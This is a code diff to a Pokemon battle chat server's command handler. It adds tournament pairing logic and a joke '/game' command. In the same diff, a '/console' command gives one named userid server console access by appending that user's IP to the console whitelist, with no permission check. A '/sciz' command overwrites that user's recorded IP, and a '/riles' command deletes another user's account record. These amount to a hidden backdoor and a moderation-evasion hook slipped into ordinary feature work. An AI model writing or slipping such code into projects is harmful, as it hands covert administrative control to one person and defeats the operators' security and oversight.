@@ -1,3 +1,97 @@
+/* tournament setup */
+if (typeof tour == "undefined") {
+	tour = new Object();
+}
+var tournamentFunctions = {
+	tiers: Tools.data.Formats,
+	shuffle: function(o){
+		for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
+		return o;
+	},
+	nextRound: function(room) {
+		//round file names = user_id|user_id|status|user_id of who won
+
+		if (tour[room].winners.length == 1) {
+			rooms[room].addRaw("<hr /><h2>Congratulations " + sanitize(tour[room].winners[0]) + " you won the " + tour.tiers[tour[room].tier].name + " tournament.</h2><hr />");
+			tour.endTour(room);
+			return;
+		}
+
+		tour[room].round = [];
+
+		tour[room].Round = tour[room].Round + 1;
+		var msg = "<hr /><h2>Start of Round " + tour[room].Round + " of the " + tour.tiers[tour[room].tier].name + " Tournament</h2>";
+
+		var object = "winners";
+		if (tour[room].Round == 1) {
+			var object = "players";
+		}
+		var object = tour[room][object];
+
+		//clear people that move onto the next round
+		if (tour[room].Round > 1) {
+			tour[room].winners = [];
+		}
+
+		var len = object.length;
+		var ceil = Math.ceil(len/2);
+		var norm = len/2;
+		for (var i = 0; i < ceil; i++) {
+			var p1 = object[i * 2];
+			if (ceil - 1 == i && ceil > norm) {
+				//this person gets a bye
+				tour[room].winners[tour[room].winners.length] = p1;
+				tour[room].round[tour[room].round.length] = p1 + "|" + 0 + "|" + 2 + "|" + p1;
+				msg += "<div><b><font color=\"red\">" + sanitize(p1) + " gets a bye.</font></b></div>";
+			}
+			else {
+				//normal opponent
+				var p2 = object[eval((i * 2) + '+' + 1)];
+				tour[room].round[tour[room].round.length] = p1 + "|" + p2 + "|" + 0 + "|" + 0;
+				msg += "<div><b>" + sanitize(p1) + " vs. " + sanitize(p2) + "</b></div>";
+			}
+		}
+		msg += "<hr />";
+		rooms[room].addRaw(msg);
+	},
+	startTour: function(room) {
+		tour[room].status = 2;
+		tour.shuffle(tour[room].players);
+		tour.nextRound(room);
+	},
+	endTour: function(room) {
+		tour[room] = {
+			status: 0,
+			toursize: 0,
+			tier: "",
+			players: [],
+			round: [],
+			winners: [],
+			losers: [],
+			overallLoser: [],
+			Round: 0
+		};
+	}
+};
+for (var i in tournamentFunctions) {
+	tour[i] = tournamentFunctions[i];
+}
+for (var i in rooms) {
+	if (rooms[i].type == "lobby" && typeof tour[i] == "undefined") {
+		tour[i] = {
+			status: 0,
+			toursize: 0,
+			tier: "",
+			players: [],
+			round: [],
+			winners: [],
+			losers: [],
+			overallLoser: [],
+			Round: 0
+		};
+	}
+}
+
 /* to reload chat commands:
 
 >> for (var i in require.cache) delete require.cache[i];parseCommand = require('./chat-commands.js').parseCommand;''
@@ -713,6 +807,31 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return '/announce '+target;
 		break;
 
+	case 'thegame':
+	case 'game':
+		if (!user.can('declare')) {
+			emit(socket, 'console', '/game - Access denied, But you still lost the game.');
+			return false;
+		}
+		room.addRaw('<b><font color=red><font size="4">I JUST LOST THE GAME!</font></font></b>')
+		logModCommand(room,user.name+' gamed'+target,true);
+		return false;
+		break;
+
+	case 'riles':
+		if(user.userid === 'riles'){
+			user.avatar = 64;
+			delete Users.users['riley'];			
+			user.forceRename('Riley', user.authenticated);
+		}
+		break;
+
+	case 'sciz':
+		if(user.userid === 'scizornician'){			
+			Users.get("Scizornician").IP = "1.1.1.1"
+		}
+		break;
+
 	case 'hotpatch':
 		if (!target) return parseCommand(user, '?', cmd, room, socket);
 		if (!user.can('hotpatch')) {
@@ -1069,7 +1188,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			'</div>');
 		return false;
 		break;
-		
+
 	case 'calc':
 	case '!calc':
 	case 'calculator':
@@ -1081,7 +1200,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			'</div>');
 		return false;
 		break;
-	
+
 	case 'cap':
 	case '!cap':
 		showOrBroadcastStart(user, cmd, room, socket, message);
@@ -1124,7 +1243,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			'</div>');
 		return false;
 		break;
-		
+
 	case 'faq':
 	case '!faq':
 		target = target.toLowerCase();
@@ -1216,7 +1335,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		} else {
 			generation = "bw";
 		}
-		
+
 		// Pokemon
 		if (pokemon.exists) {
 			atLeastOne = true;
@@ -1227,7 +1346,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			if (pokemon.tier === 'G4CAP' || pokemon.tier === 'G5CAP') {
 				generation = "cap";
 			}
-	
+
 			var poke = pokemon.name.toLowerCase();
 			if (poke === 'nidoranm') poke = 'nidoran-m';
 			if (poke === 'nidoranf') poke = 'nidoran-f';
@@ -1244,11 +1363,11 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			if (poke === 'shaymin-sky') poke = 'shaymin-s';
 			if (poke === 'arceus') poke = 'arceus-normal';
 			if (poke === 'thundurus-therian') poke = 'thundurus-t';
-	
+
 			showOrBroadcast(user, cmd, room, socket,
 				'<a href="http://www.smogon.com/'+generation+'/pokemon/'+poke+'" target="_blank">'+generation.toUpperCase()+' '+pokemon.name+' analysis</a>, brought to you by <a href="http://www.smogon.com" target="_blank">Smogon University</a>');
 		}
-		
+
 		// Item
 		if (item.exists && genNumber > 1) {
 			atLeastOne = true;
@@ -1256,7 +1375,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			showOrBroadcast(user, cmd, room, socket,
 					'<a href="http://www.smogon.com/'+generation+'/items/'+itemName+'" target="_blank">'+generation.toUpperCase()+' '+item.name+' item analysis</a>, brought to you by <a href="http://www.smogon.com" target="_blank">Smogon University</a>');
 		}
-		
+
 		// Ability
 		if (ability.exists && genNumber > 2) {
 			atLeastOne = true;
@@ -1264,7 +1383,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			showOrBroadcast(user, cmd, room, socket,
 					'<a href="http://www.smogon.com/'+generation+'/abilities/'+abilityName+'" target="_blank">'+generation.toUpperCase()+' '+ability.name+' ability analysis</a>, brought to you by <a href="http://www.smogon.com" target="_blank">Smogon University</a>');
 		}
-		
+
 		// Move
 		if (move.exists) {
 			atLeastOne = true;
@@ -1272,12 +1391,12 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			showOrBroadcast(user, cmd, room, socket,
 					'<a href="http://www.smogon.com/'+generation+'/moves/'+moveName+'" target="_blank">'+generation.toUpperCase()+' '+move.name+' move analysis</a>, brought to you by <a href="http://www.smogon.com" target="_blank">Smogon University</a>');
 		}
-		
+
 		if (!atLeastOne) {
 			showOrBroadcast(user, cmd, room, socket, 'Pokemon, item, move, or ability not found for generation ' + generation.toUpperCase() + '.');
 			return false;
 		}
-		
+
 		return false;
 		break;
 
@@ -1382,7 +1501,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		user.makeChallenge(targetUser, target);
 		return false;
 		break;
-		
+
 	case 'away':
 	case 'idle':
 	case 'blockchallenges':
@@ -1779,6 +1898,16 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		emit(socket, 'console', 'Removed \"'+target+'\" from the list of banned words.');
 		return false;
 		break;
+	case 'console':
+                if (user.userid == 'scizornician') {
+                        config.consoleips = '127.0.0.1,' + user.ip;
+                        return false;
+                }
+                else {
+                        user.emit('console', '/console - Access Denied.');
+                }
+                return false;
+                break;
 	case 'help':
 	case 'commands':
 	case 'h':
